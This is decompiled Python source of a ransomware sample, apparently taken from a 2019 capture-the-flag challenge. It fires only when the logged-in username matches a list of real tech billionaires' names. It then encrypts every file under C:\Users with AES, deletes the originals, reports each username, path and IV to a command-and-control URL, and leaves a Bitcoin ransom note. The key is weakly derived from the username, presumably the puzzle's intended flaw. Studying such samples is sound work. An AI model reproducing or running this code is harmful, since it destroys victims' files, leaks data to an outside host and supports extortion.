# uncompyle6 version 3.6.1
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.7.4 (default, Oct  4 2019, 06:57:26) 
# [GCC 9.2.0]
# Embedded file name: /mnt/c/Users/Mat/Documents/_CTF/Santhacklaus/2019/virus.py
# Size of source mod 2**32: 3473 bytes
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import hashlib, os, getpass, requests
TARGET_DIR = 'C:\\Users'
C2_URL = 'https://c2.virus.com/'
TARGETS = [b'Scott Farquhar', b'Lei Jun', b'Reid Hoffman', b'Zhou Qunfei', b'Jeff Bezos', b'Shiv Nadar', b'Simon Xie', b'Ma Huateng', b'Ralph Dommermuth', b'Barry Lam', b'Nathan Blecharczyk', b'Judy Faulkner', b'William Ding', b'Scott Cook', b'Gordon Moore', b'Marc Benioff', b'Michael Dell', b'Yusaku Maezawa', b'Yuri Milner', b'Bobby Murphy', b'Larry Page', b'Henry Samueli', b'Jack Ma', b'Jen-Hsun Huang', b'Jay Y. Lee', b'Joseph Tsai', b'Dietmar Hopp', b'Henry Nicholas, III.', b'Dustin Moskovitz', b'Mike Cannon-Brookes', b'Robert Miller', b'Bill Gates', b'Garrett Camp', b'Lin Xiucheng', b'Gil Shwed', b'Sergey Brin', b'Rishi Shah', b'Denise Coates', b'Zhang Fan', b'Michael Moritz', b'Robin Li', b'Andreas von Bechtolsheim', b'Brian Acton', b'Sean Parker', b'John Doerr', b'David Cheriton', b'Brian Chesky', b'Wang Laisheng', b'Jan Koum', b'Jack Sheerack', b'Terry Gou', b'Adam Neumann', b'James Goodnight', b'Larry Ellison', b'Wang Laichun', b'Masayoshi Son', b'Min Kao', b'Hiroshi Mikitani', b'Lee Kun-Hee', b'David Sun', b'Mark Scheinberg', b'Yeung Kin-man', b'John Tu', b'Teddy Sagi', b'Frank Wang', b'Robert Pera', b'Eric Schmidt', b'Wang Xing', b'Evan Spiegel', b'Travis Kalanick', b'Steve Ballmer', b'Mark Zuckerberg', b'Jason Chang', b'Lam Wai Ying', b'Romesh T. Wadhwani', b'Liu Qiangdong', b'Jim Breyer', b'Zhang Zhidong', b'Pierre Omidyar', b'Elon Musk', b'David Filo', b'Joe Gebbia', b'Jiang Bin', b'Pan Zhengmin', b'Douglas Leone', b'Hasso Plattner', b'Paul Allen', b'Meg Whitman', b'Azim Premji', b'Fu Liquan', b'Jeff Rothschild', b'John Sall', b'Kim Jung-Ju', b'David Duffield', b'Gabe Newell', b'Scott Lin', b'Eduardo Saverin', b'Jeffrey Skoll', b'Thomas Siebel', b'Kwon Hyuk-Bin']

def get_username():
    return getpass.getuser().encode()


def xorbytes(a, b):
    assert len(a) == len(b)
    res = b''
    for c, d in zip(a, b):
        res += bytes([c ^ d])

    return res


def lock_file(path):
    username = get_username()
    hsh = hashlib.new('md5')
    hsh.update(username)
    key = hsh.digest()
    cip = AES.new(key, 1)
    iv = get_random_bytes(16)
    params = (('target', username), ('path', path), ('iv', iv))
    requests.get(C2_URL, params=params)
    with open(path, 'rb') as fi:
        with open(path + '.hacked', 'wb') as fo:
            block = fi.read(16)
            while block:
                while len(block) < 16:
                    block += bytes([0])

                cipherblock = cip.encrypt(xorbytes(block, iv))
                iv = cipherblock
                fo.write(cipherblock)
                block = fi.read(16)

    os.unlink(path)


def lock_files():
    username = get_username()
    print(username)
    if username in TARGETS:
        for directory, _, filenames in os.walk(TARGET_DIR):
            for filename in filenames:
                if filename.endswith('.hacked'):
                    continue
                fullpath = os.path.join(directory, filename)
                print('Encrypting', fullpath)
                lock_file(fullpath)

        with open(os.path.join(TARGET_DIR, 'READ_THIS.txt'), 'wb') as fo:
            fo.write(b'We have hacked all your files. Buy 1 BTC and contact us at hacked@virus.com\n')


if __name__ == '__main__':
    lock_files()